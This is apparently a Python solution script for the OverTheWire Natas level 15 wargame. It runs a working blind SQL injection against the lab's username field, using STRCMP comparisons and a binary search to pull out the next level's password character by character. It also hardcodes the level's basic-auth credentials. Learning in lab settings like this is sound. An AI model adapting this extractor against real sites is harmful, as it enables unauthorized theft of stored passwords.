import socket
import regex
import math
import time
#generate list of characters
chars=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','r','s','t','u','v','w','x','y','z']
r_ex=regex.escape("HTTP/1.1 200 OK")
lt_ex=regex.escape("This user exists")
gt_ex=regex.escape("This user doesn't exist")
#request=bytes("GET /index.php?username=natas16%22%20AND%20STRCMP(\"U\",password)<1%20--%20&debug=1 HTTP/1.1\r\nHost: natas15.natas.labs.overthewire.org\r\nAuthorization: Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==\r\n\r\n","utf-8")
buf=bytearray(pow(2,12))

#The login for natas15 basic auth username & password are combined with a colon then utf-8 base64 is applied. This becomes Http header.
#natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
#Authorization: Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==
#URL codes are needed for spaces and the unbalanced quote
# %20 = space
# %22 = "

#CyberChef.org can be used to quickly obtain the base64 conversion.

#open socket to send request
s=socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM,proto=0)
s.setblocking(1)
s.settimeout(5.0)
s.connect(("natas15.natas.labs.overthewire.org",80))
#now we can try hacking!!

#we need to make effective request in a loop up to 32 characters long for the length of the password
# we also  should used a halving algorith to quickly find each letter
pwd=""
#pwd="TRD7iZrd5GATJJ9PKPE"
lbound=0
ubound=len(chars)-1
new_c=""
for c in range(0,32):
	lbound=0
	ubound=len(chars)-1
	while True:
		mid=math.floor((ubound+lbound)/2)
		print("LB={0} Mid={1} UB={2}".format(lbound,mid,ubound),end=" ")
		if lbound==mid:
			print("\nFound:"+chars[mid],end="\n\n\n")
			pwd=pwd+chars[mid]
			break
		new_c=pwd+chars[mid]
		request=bytes("GET /index.php?username=natas16%22%20AND%20STRCMP(BINARY%20\""+new_c+"\",password)<1%20--%20&debug=1 HTTP/1.1\r\nHost: natas15.natas.labs.overthewire.org\r\nAuthorization: Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==\r\n\r\n","utf-8")
		#print(request,end="\n\n\n")
		s.send(request)
		#buf=s.recv(pow(2,16))
		n=s.recv_into(buf,pow(2,12))
		str=buf.decode("utf-8")
		print("Got {0} bytes".format(n),end="\n")
		#print(str)

		#Check whether the buffer was filled and dump data left on server.
		#while n>0:
		#	n=s.recv_into(buf,pow(2,16))
		#	str=buf.decode("utf-8")
		#	print(str,end="\n\n")
		#print(str,end="\n\n\n\n")
		
		#check for the the HTTP OK 200 Code for successful query
		h=regex.match(r_ex,str)
		if h is None:
			print(str)
			print("FAIL! Http Error")
			exit()
		#Query Success, look for Result string
		m=regex.search(lt_ex,str)
		n=regex.search(gt_ex,str)
		if m is not None:
			print("Pass > "+new_c,end="\n\n")
			lbound=mid
		#else:
			#print("Positive match fail")
		if n is not None:
			ubound=mid
			print("Pass < "+new_c,end="\n\n")
		#else:
			#print("Negative match fail")
		regex.purge()
		time.sleep(2)
#we have a request that can  use looping to  slowy get the password, try every letter until
print(buf.decode("utf-8"))

s.close()
